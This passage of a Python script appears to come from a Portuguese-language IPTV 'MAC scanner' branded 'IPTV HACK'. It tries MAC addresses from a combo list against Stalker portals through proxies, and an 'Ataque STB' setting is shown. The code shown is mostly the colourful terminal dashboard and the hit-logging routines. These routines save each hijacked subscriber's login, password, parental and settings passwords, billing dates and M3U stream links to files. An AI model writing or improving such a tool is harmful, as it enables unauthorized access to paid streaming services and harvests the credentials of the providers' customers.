    ───────────────────────────╚╝────Chemistry Remake               \33[1;38;5;2m
                   ___                      ___
                  (o o)                    (o o)
                 (  V  ) Josiel Jefferson (  V  )
                 --m-m----------------------m-m--
                  𝑬𝒍𝒆𝒄𝒕𝒓𝒐𝒏 𝑺𝒑𝒆𝒆𝒅-𝑿 𝒃𝒚 𝑱𝒐𝒔𝒊𝒆𝒍 𝑱𝒆𝒇𝒇𝒆𝒓𝒔𝒐𝒏             \33[1;0m
\n{COR(16)}{FUNDO(15)}        ᴇʟᴇᴄᴛʀᴏɴ sᴘᴇᴇᴅ-x ᴘʀᴏ sᴄᴀɴɴᴇʀ sᴛᴀʟᴋᴇʀ ᴘᴏʀᴛᴀʟ ᴊᴏsɪᴇʟ ᴊᴇғғᴇʀsᴏɴ       \x1b[1;0m \n
\33[91m████████████████████████\33[93m████████████████████████\33[92m██████████████████████            \n
\33[91m     ░░░░░░█░█░█░░▀█▀░▀█▀░█▄█░█▀█░█░█░░░░░░            \33[0m
\33[93m     ░░░░░░█░█░█░░░█░░░█░░█░█░█▀█░▄▀▄░░░░░░            \33[0m
\33[92m     ░░░░░░▀▀▀░▀▀▀░▀░░▀▀▀░▀░▀░▀░▀░▀░▀░░░░░░ IP CLOUDFLARE            \33[0m\n
\33[91m████████████████████████\33[93m████████████████████████\33[92m██████████████████████            \n
""")
time.sleep(1)
bekleme=1
cpm=0
cpmx=0
hitr=0
m3uon=0
m3uvpn=0
macon=0
macvpn=0
macexp = 0
exp = ""; exp = "None"; exp = 0
last_good_date = "None"
last_bad_date = "None"
last_good_mac = ""
last_bad_mac = ""
respons=""
color=""
cloudflare_status_str = "𝐀𝐓𝐈𝐕𝐎"
def check_cloudflare(url):
    try:
        response = requests.get(url)
        if 'Server' in response.headers and 'cloudflare' in response.headers['Server'].lower():
            return True
        else:
            return False
    except requests.RequestException as e:
        print(f"Fehler beim prüfen der URL {e}")
        return False
def cloudflare_status(url):
    """CLOUDFLARE aktiv "ON" oder inaktiv "OFF" prüfen"""
    return "ON" if check_cloudflare(url) else "OFF"
def get_country(ip_address):
    url = f"https://ipapi.co/{ip_address}/json/"
    try:
        response = requests.get(url)
        data = response.json()
        return data.get('country_name')
    except Exception as e:
        print(f"Fehler bei Überprüfung : {e}")
        return None
response = requests.get('https://ipleak.net/json/')
country_code = response.json()['country_code']
flag = ''
for char in country_code:
    flag += chr(ord(char) + 127397)
flag = flag.upper()
my_ip = "my.IP: {} [{} {}]".format(response.json()['ip'], flag, response.json()['country_name'])
def show_loading_bar(percentage):
	bar_length = 20
	num_blocks = int(percentage / (100 / bar_length))
	bar = "❚" * num_blocks + "-" * (bar_length - num_blocks)
	return f"⟬{bar}⟭ {percentage}%"
def echok(mac, bot, total, hitc, oran):
	global servisp, ipserv2, countryserv, flagserv2, cpm, hitr, m3uon, m3uvpn, m3uonxmacon, macvpn, macon, bib, tokenr, proxies, respons, color, macexp
	global exp, last_good_date, last_good_mac, last_bad_date, last_bad_mac
	bib=0
	cpmx=(time.time()-cpm)
	cpmx=(round(60/cpmx))
	if str(cpmx)=="0":
			cpm=cpm
	else:
			cpm=cpmx
	colors = [90, 91, 92, 93, 94, 95, 96, 97]
	color_code = colors[int(time.time()) % len(colors)]
	def colors(index):
	    return f"\33[1;38;5;{index}m"
	colors_list = [i for i in range(256)]
	colors_list = [i for i in range(256) if i not in [0, 16, 8, 59, 60, 102, 103, 145, 146, 188, 189, 231] and not (232 <= i <= 246)]
	color_index = int(time.time()) % len(colors_list)
	color_number = colors_list[color_index]
	color_code = colors(color_number)
	ElectronSpeedX = f"""
★      ★      ★      ★      ★      ★      ★       ★      ★      ★      ★
    ╔═══╦╗──────╔╗─────────╔═══╗──────────╔╗─╔═╗╔═╗               
    ║╔══╣║─────╔╝╚╗────────║╔═╗║──────────║║─╚╗╚╝╔╝               
    ║╚══╣║╔══╦═╩╗╔╬═╦══╦═╗─║╚══╦══╦══╦══╦═╝║──╚╗╔╝               
    ║╔══╣║║║═╣╔═╣║║╔╣╔╗║╔╗╗╚══╗║╔╗║║═╣║═╣╔╗╠══╦╝╚╗               
    ║╚══╣╚╣║═╣╚═╣╚╣║║╚╝║║║║║╚═╝║╚╝║║═╣║═╣╚╝╠═╦╝╔╗╚╗               
    ╚═══╩═╩══╩══╩═╩╝╚══╩╝╚╝╚═══╣╔═╩══╩══╩══╝─╚═╝╚═╝               
    ───────────────────────────║║─by Josiel Jefferson               
    ───────────────────────────╚╝────Chemistry Remake               
                   ___                      ___
                  (o o)                    (o o)
                 (  V  ) Josiel Jefferson (  V  )
                 --m-m----------------------m-m--
                  𝑬𝒍𝒆𝒄𝒕𝒓𝒐𝒏 𝑺𝒑𝒆𝒆𝒅-𝑿 𝒃𝒚 𝑱𝒐𝒔𝒊𝒆𝒍 𝑱𝒆𝒇𝒇𝒆𝒓𝒔𝒐𝒏
{color_number}        ᴇʟᴇᴄᴛʀᴏɴ sᴘᴇᴇᴅ-x ᴘʀᴏ sᴄᴀɴɴᴇʀ sᴛᴀʟᴋᴇʀ ᴘᴏʀᴛᴀʟ ᴊᴏsɪᴇʟ ᴊᴇғғᴇʀsᴏɴ        {color_number}\n
	"""
	text = " © AUTO ULTIMAX IP CLOUDFLARE © "
	echo=("""
\33["""+str(color_code)+""""""+ElectronSpeedX+""" """+RESET+"""
\33[91m░░░█░█░█░░▀█▀░▀█▀░█▄█░█▀█░█░█░░░      \33[0m
\33[93m░░░█░█░█░░░█░░░█░░█░█░█▀█░▄▀▄░░░      \33[0m
\33[92m░░░▀▀▀░▀▀▀░▀░░▀▀▀░▀░▀░▀░▀░▀░▀░░░ IP CLOUDFLARE            \33[0m\n
\033[1;92m┌\33[1m\033[1;33m\33[48;5;022m  MAC SCANNER  PRO PROXY  \033[0m
\033[1;92m╽╭─\33[38;5;227m\33[48;5;023m\33[1m MOD BY PRL AND FABRIZIO    \33[0m
\033[1;92m┃├►⚜️  \33["""+str(color_code)+""""""+text+""" ⚜️ \33[0m
\033[1;92m┃╰─\33[38;5;227m\33[48;5;023m\33[1m 𝑬𝒍𝒆𝒄𝒕𝒓𝒐𝒏 𝑺𝒑𝒆𝒆𝒅-𝑿 𝒃𝒚 𝑱𝒐𝒔𝒊𝒆𝒍 𝑱𝒆𝒇𝒇𝒆𝒓𝒔𝒐𝒏    \33[0m
\033[1;92m┃\33[0m╭───•➢ » SCAN 🅸 🅽 🅵‍ 🄾 «─      \33[0m
\033[1;92m┃\33[0m├► \033[1;91mSistema \033[1;92m●\33[0m► """+my_os+"""      \33[0m
\033[1;92m┃\33[0m├► \033[1;92mScanner \033[1;92m●\33[0m► """+my_py+"""      \33[0m
\033[1;92m┃\33[0m├► \033[1;93mCPU \033[1;92m●\33[0m► """+str(my_cpu)+"""     \33[0m
\033[1;92m┃\33[0m├► \033[1;91mScan de  \033[1;92m●\33[0m► """+str(nickn)+"""   \33[0m
\033[1;92m┃\33[0m├► \033[1;93mConexão ► \033[1;92m●\33[0m► """+str(connection_types)+""" \33[0m
\033[1;92m┃\33[0m├► \033[1;93mIP ►\033[1;92m●\33[0m► """+str(my_ip)+"""  \33[0m
\033[1;92m┃\33[0m├► \033[1;31mINÍCIO \033[1;92m●\33[0m► """+str(hora_ini)+"""  \33[0m
\033[1;92m┃\33[0m├► \033[1;31mTEMPO \033[1;92m●\33[0m► \33[1;32m"""+str(time.strftime('%d/%m/%Y - %H:%M:%S'))+"""  \33[0m
\033[1;92m┃\33[0m├► \033[1;31mCRONOMETRO \033[1;92m●\33[0m► """+cronometrar_tempo()+"""  \33[0m
\033[1;92m┃\33[0m╰───── ✬ 🅸 ptv 🅷 🄰 🄲 🅺 ✬ ───        \33[0m
\033[1;92m┃\33[0m╭───•➢ » SERVER  🅸 🅽 🅵‍ 🄾 «─      \33[0m
\033[1;92m┃\33[0m├► \033[1;91mPORTAL ►\033[1;92m●\33[0m► """+str(panel)+"""   \33[0m
\033[1;92m┃\33[0m├► \033[1;91mTipo do Portal ► \033[1;92m●\33[0m► """+str(uzmanm)+""" \33[0m
\033[1;92m┃\33[0m├► \033[1;94mProvedor ► \033[1;92m●\33[0m► """+str(servisp)+"""\33[0m
\033[1;92m┃\33[0m├► \033[1;94mServidor ► \033[1;92m●\33[0m► """+str(ipserv2)+"""  """+str(flagserv2)+""" \33[0m
\033[1;92m┃\33[0m├► \033[1;94mNação ► \033[1;92m●\33[0m► """+str(countryserv)+"""  """+str(flagserv2)+""" \33[0m
\033[1;92m┃\33[0m╰───── ✬ 🅸 ptv 🅷 🄰 🄲 🅺 ✬ ───          \33[0m
\033[1;92m┃\33[0m╭───•➢ » COMBO 🅸 🅽 🅵‍ 🄾 «─      \33[0m
\033[1;92m┃\33[0m├► \033[1;93mCOMBO \033[1;92m●\33[0m► \33[1;96m"""+str(combodosya)+""" \33[0m
\033[1;92m┃\33[0m├► \033[1;92mMAC \033[1;92m●\33[0m► """+tokenr+str(mac)+"""  \33[0m
\033[1;92m┃\33[0m├► \033[1;94mTOTAL \33[1;96m"""+str(total)+""" \33[0m/\33[1;93m """+str(combouz)+""" \33[1;31m"""+show_loading_bar(oran)+""" \33[0m
\033[1;92m┃\33[0m├► \033[1;93mCPM \033[1;92m●\33[0m► \33[1;33m"""+str(cpm)+""" \33[0m \33[1mBOTS  \033[1;92m●\33[0m► \33[1;32m"""  +str(bot)+""" \33[0m
\033[1;92m┃\33[0m╰───── ✬ 🅸 ptv 🅷 🄰 🄲 🅺 ✬ ───      \33[0m
\033[1;92m┃\33[0m╭───•➢ » PROXY 🅸 🅽 🅵‍ 🄾 «─        \33[0m
\033[1;92m┃\33[0m├► \033[1;91mPROXY \033[1;92m●\33[0m► \33[1;31m"""+str(proxysay)+""" \33[0m """+statusproxy+"""  \33[0m
\033[1;92m┃\33[0m╰───── ✬ 🅸 ptv 🅷 🄰 🄲 🅺 ✬ ───       \33[0m
\033[1;92m┃\33[0m╭───•➢ » HITS 🅸 🅽 🅵‍ 🄾 «─        \33[0m
\033[1;92m┃\33[0m├► \033[93mHits \33[0m  \033[0;91m"""+str(hitr)+ '' +str(hit)+ """ \33[0m\33[32mUnlimited """ + str(exp) +""" \33[0m \033[91mShits\33[0m\33[91m  """+str(macexp)+"""   \33[0m
\033[1;92m┃\33[0m├► \033[1;92mM3U \033[1;92m●\33[0m► \33[1;32m"""+str(m3uon)+"""\33[0m  / \33[1;31m """+str(m3uvpn)+""" \33[0m
\033[1;92m┃\33[0m├► \033[1;92mMAC \033[1;92m●\33[0m► \33[1;32m"""+str(macon)+"""\33[0m  / \33[1;31m """+str(macvpn)+""" \33[0m
\033[1;92m┃\33[0m├► \033[1;92m \033[1;92m●\33[0m► \33[1;32m""" + categorias_ptbr + """ \33[0m
\033[1;92m┃\33[0m├► \033[1;91mRUIM \033[1;92m●\33[0m► EXPIRADO \033[1;92m●\33[0m► \33[1;91m """ + str(last_bad_date) + """ \33[0m
\033[1;92m┃\33[0m├► \033[1;92mBOM \033[1;92m●\33[0m► ATIVO \033[1;92m●\33[0m► \33[1;92m """ + str(last_good_date) + """ \33[0m
\033[1;92m┃\33[0m╰───── ✬ 🅸 ptv 🅷 🄰 🄲 🅺 ✬ ───          \33[0m
\033[1;92m┃╭─\33[38;5;227m\33[48;5;023m\33[1mAUTO ULTIMAX IP CLOUDFLARE     \33[0m
\033[1;92m╿╰─\33[38;5;227m\33[48;5;023m\33[1m𝑬𝒍𝒆𝒄𝒕𝒓𝒐𝒏 𝑺𝒑𝒆𝒆𝒅-𝑿 𝒃𝒚 𝑱𝒐𝒔𝒊𝒆𝒍 𝑱𝒆𝒇𝒇𝒆𝒓𝒔𝒐𝒏     \33[0m
\033[1;92m└\33[1m\33[48;5;010m\33[38;5;232m  PYTHON PROJECT    \033[0m\n
\033[1;93m┌\033[93m\33[1m\33[48;5;124m              PREMIUM  PYTHON          \33[0m
\033[1;93m╽╭─\33[92m Olá » """ +  str(nickn) + """  \33[0m
\033[1;93m┃├► \033[38;5;003m\033[1;92m●\33[0m► Vᴏᴄê Eѕᴄᴏʟʜᴇᴜ ► """ + str(bot) + """ [33mBᴏᴛѕ [0m
\033[1;93m┃├► \033[38;5;003m\033[1;92m●\33[0m► IPv³Aɢᴇɴᴛᴇ ► """ + str(agentx) + """ \33[0m
\033[1;93m┃├► \033[38;5;003m\033[1;92m●\33[0m► IPv³Aᴛᴀϲᴋ ► """ + str(attack) + """ \33[0m
\033[1;93m┃├► \033[38;5;003m\033[1;92m●\33[0m► Tɪᴘᴏᴘʜᴘ ► """ + str(albstb3) + """ \33[0m
\033[1;93m┃├► \033[38;5;003m\033[1;92m●\33[0m► CʟᴏᴜᴅFʟᴀʀᴇ ► """+(cloudflare_status_str)+"""
\033[1;93m╿├► \033[38;5;003m\033[1;92m●\33[0m► Pʀᴏᴛᴏᴄᴏʟᴏ ►\33[0mHTTP ►\33[0m\33[33m|\33[0m"""+color+tokenr+str(respons)+"""\33[0m\33[33m|  \33[0m \x1b[0m""" + str(infophpx) + """ \33[0m
\033[1;93m└\033[93m\33[1m\33[48;5;124m MAC SCANNER PRO PROXY \33[0m \033[40m\033[30m
""")
	os.system("cls" if os.name == "nt" else "clear")
	print(echo)
	cpm=time.time()
	time.sleep(0.5)
bot=0
hit=0
hitr="\33[1;33m"
tokenr="\33[0m"
oran=""
def bekle(bib,vr):
	i=bib
kanalkata="2"
stalker_portal="PRL"
def hityaz(sip,data_server,scount,servreg,sname,mac,trh,real,m3ulink,m3uimage,durum,vpn,livelist,vodlist,serieslist,playerapi,fname,tariff_plan,ls,login,password,tariff_plan_id,bill,expire_billing_date,max_online,parent_password,stb_type,comment,country,settings_password,country_name,scountry,kanalsayisi,filmsayisi,dizisayisi,ip):
	global hitr,hitsay
	panell=panel
	reall=real
	palavras_chave_br = ["|🇧🇷", "BR|", "BRASIL", "BRAZIL", "Brasil", "Brazil", "[CH] BR - ABERTOS", "BRAZİL"]
	br_channels = any(keyword in livelist.upper() for keyword in palavras_chave_br)
	categoria_br = 'Sim! 🇧🇷' if br_channels else 'Não'
	palavras_chave_pt = ["|🇵🇹", "PT|", "PORTUGAL", "Portugal", "|🇵🇹 PT", "🇵🇹 PT", "[PT]", "PT|"]
	pt_channels = any(keyword in livelist.upper() for keyword in palavras_chave_pt)
	categoria_pt = 'Sim! 🇵🇹' if pt_channels else 'Não'
	palavras_chave_br = ["|🇧🇷", "BR|", "BRASIL", "BRAZIL", "Brasil", "Brazil", "[CH] BR - ABERTOS", "BRAZİL"]
	palavras_chave_pt = ["|🇵🇹", "PT|", "PORTUGAL", "Portugal", "|🇵🇹 PT", "🇵🇹 PT", "[PT]", "PT|"]
	livelist_upper = livelist.upper()
	br_detectado = any(keyword.upper() in livelist_upper for keyword in palavras_chave_br)
	pt_detectado = any(keyword.upper() in livelist_upper for keyword in palavras_chave_pt)
	categorias2_ptbr = ""
	categorias2_ptbr += f"├㋡ ➤ 《ℂ𝔸𝕋𝔼𝔾𝕆ℝ𝕀𝔸 𝔹ℝ》☞ {'Sim! 🇧🇷' if br_detectado else 'Não'}\n"
	categorias2_ptbr += f"├㋡ ➤ 《ℂ𝔸𝕋𝔼𝔾𝕆ℝ𝕀𝔸 ℙ𝕋》☞ {'Sim! 🇵🇹' if pt_detectado else 'Não'}"
	if 'PRL' == 'PRL':
		simza=""
		if uzmanm=="stalker_portal/server/load.php":
			panell=str(panel)+'/stalker_portal'
			reall=real.replace('/c/','/stalker_portal/c/')
			simza = """
╔═  ▼ ⚜️🅂🅃🅰︎🅻🅺🅴🅁✮🅸🅽🅵‍🄾⚜️
├㋡ ➤ Data de Cobrança ☞  """ + str(bill) + """
├㋡ ➤ Data de Expiração ☞  """ + expire_billing_date + """
├㋡ ➤ Usuário ☞  """ + login + """
├㋡ ➤ Senha ☞  """ + password + """
├㋡ ➤ Nome Completo ☞  """ + fname + """
├㋡ ➤ Senha para Adultos ☞  """ + parent_password + """
├㋡ ➤ ID do Plano ☞  """ + tariff_plan_id + """
├㋡ ➤ Plano de Tarifa ☞  """ + tariff_plan + """
├㋡ ➤ Máximo Online ☞  """ + max_online + """
├㋡ ➤ Tipo de STB ☞  """ + stb_type + """
├㋡ ➤ País ☞  """ + country + """
├㋡ ➤ Senha de Configurações ☞  """ + settings_password + """
├㋡ ➤ Comentário ☞  """ + comment + """
╚═════════ ☆🅸🅿🆃🆅 🅷🅰🅲🅺☆ ════════╝"""
		imza = """╔═⚜️-🥇-AUTO ULTIMAX IP CLOUDFLARE-🥇⚜️═╗
╚════════════════════════════════╝
╔══ ▼⚜️🆂🄲🄰🄽✩🆂🅈🆂🅃🅴🅼⚜️
├㋡ ➤ Sistema ☞  """ + my_os + """
├㋡ ➤ Scanner ☞  """ + my_py + """
├㋡ ➤ CPU ☞  """ + str(my_cpu) + """
├㋡ ➤ Data do Scan ☞ """ + str(time.strftime('%d/%m/%Y')) + """ - """ + str(time.strftime('%H:%M:%S')) + """
├㋡ ➤ Início do Scan ☞ """ + str(hora_ini) + """
╚════════════════════════════════╝
╔══ ▼⚜️🆂🄲🄰🄽✩🅸🄽🄵🄾⚜️
├㋡ ➤ Scan por ☞ """ + nickn + """ ☜
├㋡ ➤ Hora do Hit ☞ """ + str(time.strftime('%d/%m/%Y - %H:%M:%S')) + """
├㋡ ➤ Portal ☞ http://""" + str(panell) + """/c/
├㋡ ➤ MAC ☞ """ + str(mac) + """
├㋡ ➤ Real ☞ """ + str(reall) + """
├㋡ ➤ Tipo de Portal ☞ """ + str(uzmanm) + """
├㋡ ➤ Agente STB ☞ """ + str(agentx) + """
├㋡ ➤ Ataque STB ☞ """ + str(attack) + """
├㋡ ➤ Tipo de PHP ☞ """ + str(albstb3) + """
├㋡ ➤ Expira ☞ """ + str(trh.replace('Unlimited', 'Ilimitado')) + """
├㋡ ➤ Senha para Adultos ☞ 0000
╚════════════════════════════════╝
╔══ ▼ ⚜️🄺🄰🅽🄰🅻✩🄲🅷🅴🅲🄺⚜️
├㋡ ➤ MAC ☞ """ + str(durum) + """
├㋡ ➤ M3U ☞ """ + m3uimage + """
╚════════════════════════════════╝
╔══ ▼⚜️🅲🄻🅄🄸🄴🄽🅃✩🄸🄽🄵‍🄾⚜️
├㋡ ➤ IP do Cliente ☞ """ + str(vpn) + """
╚════════════════════════════════╝
╔══ ▼⚜️🆂🄴🅁🆅🄴🅁✩🅸🄽🄵🄾 ⚜️
├㋡ ➤ IP ☞ """ + str(sip) + """ """ + str(flagserv2) + """
├㋡ ➤ País ☞ """ + str(country_name) + """ """ + data_server(str(scountry)) + """ """ + str(flagserv2) + """
├㋡ ➤ Cidade ☞ """ + str(scount) + """
├㋡ ➤ Região ☞ """ + str(servreg) + """
├㋡ ➤ Nome ☞ """ + str(sname) + """
╚════════════════════════════════╝"""
		ximza="""
"""+str(playerapi)+""""""
		sifre=device(mac)
		pimza = """╔══ ⚜️ 🅼➂🅄✩🅻🄸🄽🄺 ⚜️
├㋡ ➤ M3U Portal ☞ """ + str(m3ulink) + """
╚════════════════════════════════╝"""
		imza = imza + sifre + simza + ximza + pimza
		if len(kanalsayisi) > 1:
			imza = imza + """
╔══ ⚜️🅼🄴🄳🄸🄰✩🅲🄾🅄🄽🅃⚜️
├㋡ ➤ Canais ☞ """ + kanalsayisi + """
├㋡ ➤ Vídeos ☞ """ + filmsayisi + """
├㋡ ➤ Séries ☞ """ + dizisayisi + """
╚════════════════════════════════╝"""
		if  kanalkata=="1" or kanalkata=="2":
			imza = imza + """
╔══ ⚜️🅲🄾🅄🄽🅃🅁🅈✩🅻🄸🅂🅃⚜️
""" + categorias2_ptbr + """
├㋡ ➤ 《CANAIS》[ """ + kanalsayisi + """ ]
├㋡ ➤ """ + str(livelist) + """ """
		if kanalkata=="2":
			imza = imza + """
├㋡ ➤ 《VOD》[ """ + filmsayisi + """ ]
├㋡ ➤ """ + str(vodlist) + """
├㋡ ➤ 《SÉRIES》[ """ + dizisayisi + """ ]
├㋡ ➤ """ + str(serieslist) + """
├㋡ ➤ AUTO ULTIMAX IP CLOUDFLARE✶
├㋡ ➤
╚═════════ ☆🅸🅿🆃🆅 🅷🅰🅲🅺☆ ════════╝
\n\n"""
			josielluz="""╔═⚜️-🥇-AUTO ULTIMAX IP CLOUDFLARE-🥇⚜️═╗
╚════════════════════════════════╝
╔══ ▼⚜️🆂🄲🄰🄽✩🅸🄽🄵🄾⚜️
├㋡ ➤ Sistema ☞  """ + my_os + """
├㋡ ➤ Scanner ☞  """ + my_py + """
├㋡ ➤ CPU ☞  """ + str(my_cpu) + """
├㋡ ➤ 𝕊𝙲𝙰𝙽 𝔹𝚈 ☞ """+nickn+""" ☜
├㋡ ➤ 𝕊𝚃𝙰𝚁𝚃 𝕊𝙲𝙰𝙽 ☞ """ + str(hora_ini) + """
├㋡ ➤ ℍɪᴛTɪᴍᴇ ☞ """+str(time.strftime('%d/%m/%Y - %H:%M:%S'))+"""
├㋡ ➤ ℙ𝙾𝚁𝚃𝙰𝙻 ☞ http://"""+str(panell)+"""/c/
├㋡ ➤ 𝕄𝙰𝙲 ☞ """+str(mac)+"""
├㋡ ➤ ℝ𝙴𝙰𝙻 ☞ """+str(reall)+"""
├㋡ ➤ ℙ𝙾𝚁𝚃𝙰𝙻 𝕋𝚈𝙿𝙴 ☞ """+str(uzmanm)+"""
├㋡ ➤ 𝔼𝙽𝙳𝚂 ☞ """+str(trh.replace('Unlimited', '𝐔𝐧𝐥𝐢𝐦𝐢𝐭𝐞𝐝')) +"""
╚════════════════════════════════╝
╔══ ▼ ⚜️🄺🄰🅽🄰🅻✩🄲🅷🅴🅲🄺⚜️
├㋡ ➤ 𝕄𝙰𝙲 ☞ """+str(durum)+"""
├㋡ ➤ 𝕄𝟹𝚄 ☞ """+m3uimage+"""
├㋡ ➤ IP do Cliente ☞ """ + str(vpn) + """
╚════════════════════════════════╝
╔══ ▼⚜️🆂🄴🅁🆅🄴🅁✩🅸🄽🄵🄾 ⚜️
├㋡ ➤ 𝕀𝙿 ☞ """+str(sip)+""" """+str(flagserv2)+"""
├㋡ ➤ 𝐂𝙾𝚄𝙽𝚃𝚁𝚈 ☞ """+str(country_name)+""" """+data_server(str(scountry))+""" """+str(flagserv2)+"""
├㋡ ➤ 𝐂𝙸𝚃𝚈 ☞ """+str(scount)+"""
├㋡ ➤ 𝐑𝙴𝙶𝙸𝙾𝙽 ☞ """+str(servreg)+"""
├㋡ ➤ 𝐍𝙰𝙼𝙴 ☞ """+str(sname)+"""
╚════════════════════════════════╝"""
		ximza="""
"""+str(playerapi)+""""""
		sifremini = device(mac, modo="mini")
		pimza = """╔══ ⚜️ 🅼➂🅄✩🅻🄸🄽🄺 ⚜️
├㋡ ➤ 𝕄𝟹𝚄 ℙ𝙾𝚁𝚃𝙰𝙻 ☞ """ + str(m3ulink) + """
╚════════════════════════════════╝"""
		josielluz = josielluz + sifremini + simza + ximza + pimza
		if  kanalkata=="1" or kanalkata=="2":
			josielluz = josielluz + """
╔══ ⚜️🅲🄾🅄🄽🅃🅁🅈✩🅻🄸🅂🅃⚜️
""" + categorias2_ptbr + """
├㋡ ➤ 《CANAIS》[ """ + kanalsayisi + """ ]
├㋡ ➤ """ + str(livelist) + """ """
		if kanalkata=="2":
			josielluz = josielluz + """
├㋡ ➤ 《VOD》[ """ + filmsayisi + """ ]
├㋡ ➤ """ + str(vodlist) + """
├㋡ ➤ 《SÉRIES》[ """ + dizisayisi + """ ]
├㋡ ➤ """ + str(serieslist) + """
├㋡ ➤ AUTO ULTIMAX IP CLOUDFLARE✶
├㋡ ➤
╚═════════ ☆🅸🅿🆃🆅 🅷🅰🅲🅺☆ ════════╝
\n\n"""
			imza1 = """╔═⚜️-🥇-AUTO ULTIMAX IP CLOUDFLARE-🥇⚜️═╗
╚════════════════════════════════╝
╔══ ▼  ⚜️Sistema✩Sistema⚜️
├㋡ ➤ Sistema ☞  """ + my_os + """
├㋡ ➤ Scanner ☞  """ + my_py + """
├㋡ ➤ CPU ☞  """ + str(my_cpu) + """
├㋡ ➤ Início do Scan ☞ """ + str(hora_ini) + """
├㋡ ➤ Data do Scan ☞ """ + str(time.strftime('%d/%m/%Y')) + """ - """ + str(time.strftime('%H:%M:%S')) + """
├㋡ ➤ Portal ☞ http://""" + str(panell) + """/c/
├㋡ ➤ MAC ☞ """ + str(mac) + """
├㋡ ➤ Real ☞ """ + str(reall) + """
├㋡ ➤ Tipo de Portal ☞ """ + str(uzmanm) + """
├㋡ ➤ Agente STB ☞ """ + str(agentx) + """
├㋡ ➤ Ataque STB ☞ """ + str(attack) + """
├㋡ ➤ Tipo de PHP ☞ """ + str(albstb3) + """
├㋡ ➤ Expira ☞ """ + str(trh) + """
├㋡ ➤ Scan por ☞ """ + nickn + """ ☜
╚═════════ ☆IPTV HACK☆ ════════╝
\n\n"""
			imza2 = """"""+ str(mac) + """\n"""
		yajl(josielluz)
		yazz(imza1)
		yamm(imza2)
		yaff(imza2)
		hitsay=hitsay+1
		print(imza1)
		if hitsay >= hit:
			hitr="\33[1;33m"
def get_path(filename):
    if platform.system() == "Windows":
        base_path = "./Hits/𝑨𝒖𝒕𝒐 𝑼𝒍𝒕𝒊𝒎𝒂𝒙 𝑰𝑷 𝑪𝒍𝒐𝒖𝒅𝑭𝒍𝒂𝒓𝒆"
    elif platform.system() == "Linux":
        base_path = "/sdcard/Hits/𝑨𝒖𝒕𝒐 𝑼𝒍𝒕𝒊𝒎𝒂𝒙 𝑰𝑷 𝑪𝒍𝒐𝒖𝒅𝑭𝒍𝒂𝒓𝒆"
    else:
        base_path = os.path.join(Glb.myPath, 'Hits/𝑨𝒖𝒕𝒐 𝑼𝒍𝒕𝒊𝒎𝒂𝒙 𝑰𝑷 𝑪𝒍𝒐𝒖𝒅𝑭𝒍𝒂𝒓𝒆')
    return os.path.join(base_path, filename)
def yazz(imza1):
    caminho = get_path(f"𝑨𝒖𝒕𝒐 𝑼𝒍𝒕𝒊𝒎𝒂𝒙 𝑰𝑷 𝑪𝒍𝒐𝒖𝒅𝑭𝒍𝒂𝒓𝒆 𝑯𝒊𝒕𝒔 𝑴𝒊𝒏𝒊/{panel.replace(':', '_').replace('/', '')}][{timestr}][𝑨𝒖𝒕𝒐 𝑼𝒍𝒕𝒊𝒎𝒂𝒙 𝑰𝑷 𝑪𝒍𝒐𝒖𝒅𝑭𝒍𝒂𝒓𝒆][{nickn}][𝑴𝒊𝒏𝒊].txt")
    os.makedirs(os.path.dirname(caminho), exist_ok=True)
    with open(caminho, "a+", encoding='utf-8') as dosya:
        dosya.write(imza1)
def yamm(imza2):
    caminho = get_path(f"𝑨𝒖𝒕𝒐 𝑼𝒍𝒕𝒊𝒎𝒂𝒙 𝑰𝑷 𝑪𝒍𝒐𝒖𝒅𝑭𝒍𝒂𝒓𝒆 𝑪𝒐𝒎𝒃𝒐 𝑴𝒂𝒄𝒔/{panel.replace(':', '_').replace('/', '')}][𝑨𝒖𝒕𝒐 𝑼𝒍𝒕𝒊𝒎𝒂𝒙 𝑰𝑷 𝑪𝒍𝒐𝒖𝒅𝑭𝒍𝒂𝒓𝒆][𝑪𝒐𝒎𝒃𝒐].txt")
    os.makedirs(os.path.dirname(caminho), exist_ok=True)
    with open(caminho, "a+", encoding='utf-8') as archivo:
        archivo.write(imza2)
def yaff(imza2):
    caminho = get_path("𝑨𝒖𝒕𝒐 𝑼𝒍𝒕𝒊𝒎𝒂𝒙 𝑰𝑷 𝑪𝒍𝒐𝒖𝒅𝑭𝒍𝒂𝒓𝒆 𝑪𝒐𝒎𝒃𝒐 𝑴𝒂𝒄𝒔/𝑨𝒖𝒕𝒐 𝑼𝒍𝒕𝒊𝒎𝒂𝒙 𝑰𝑷 𝑪𝒍𝒐𝒖𝒅𝑭𝒍𝒂𝒓𝒆[𝑴𝒂𝒄𝒔].txt")
    os.makedirs(os.path.dirname(caminho), exist_ok=True)
    with open(caminho, "a+", encoding='utf-8') as archivo:
        archivo.write(imza2)
def yajl(imza):
    caminho = get_path(f"{panel.replace(':', '_').replace('/', '')}][{timestr}][𝑨𝒖𝒕𝒐 𝑼𝒍𝒕𝒊𝒎𝒂𝒙 𝑰𝑷 𝑪𝒍𝒐𝒖𝒅𝑭𝒍𝒂𝒓𝒆][{nickn}][𝑯𝒊𝒕𝒔].txt")
    os.makedirs(os.path.dirname(caminho), exist_ok=True)
    with open(caminho, "a+", encoding='utf-8') as dosya:
        dosya.write(imza)
def data_server(scountry):
    bandera=''
    pais=''
    origen=''
    try:
        codpais=scountry
        bandera=flag.flag(codpais)
        origen=bandera
    except:pass
    return origen
os.system("cls" if os.name == "nt" else "clear")
options = {
    "": "𝑱𝒐𝒔𝒊𝒆𝒍 𝑱𝒆𝒇𝒇𝒆𝒓𝒔𝒐𝒏",
    "1": "ᴘʀᴏᴊᴇᴄᴛ ᴇʟᴇᴄᴛʀᴏɴ sᴘᴇᴇᴅ-x",
    "2": "𝐏𝐫𝐨𝐣𝐞𝐜𝐭 𝐄𝐥𝐞𝐜𝐭𝐫𝐨𝐧 𝐒𝐩𝐞𝐞𝐝-𝐗 𝐛𝐲 𝐉𝐨𝐬𝐢𝐞𝐥 𝐉𝐞𝐟𝐟𝐞𝐫𝐬𝐨𝐧",
    "3": "PAULO",
    "4": '"PRL"',
    "5": "✩PAPY GOGO✩"
}
os.system("cls" if os.name == "nt" else "clear")
print(PRL)
nickn = input("""\033[1;38;5;2m
Por favor, digite seu nome de usuário ou selecione uma das opções abaixo:
\n\033[1;38;5;3m
    = 𝑱𝒐𝒔𝒊𝒆𝒍 𝑱𝒆𝒇𝒇𝒆𝒓𝒔𝒐𝒏
  1 = ᴘʀᴏᴊᴇᴄᴛ ᴇʟᴇᴄᴛʀᴏɴ sᴘᴇᴇᴅ-x
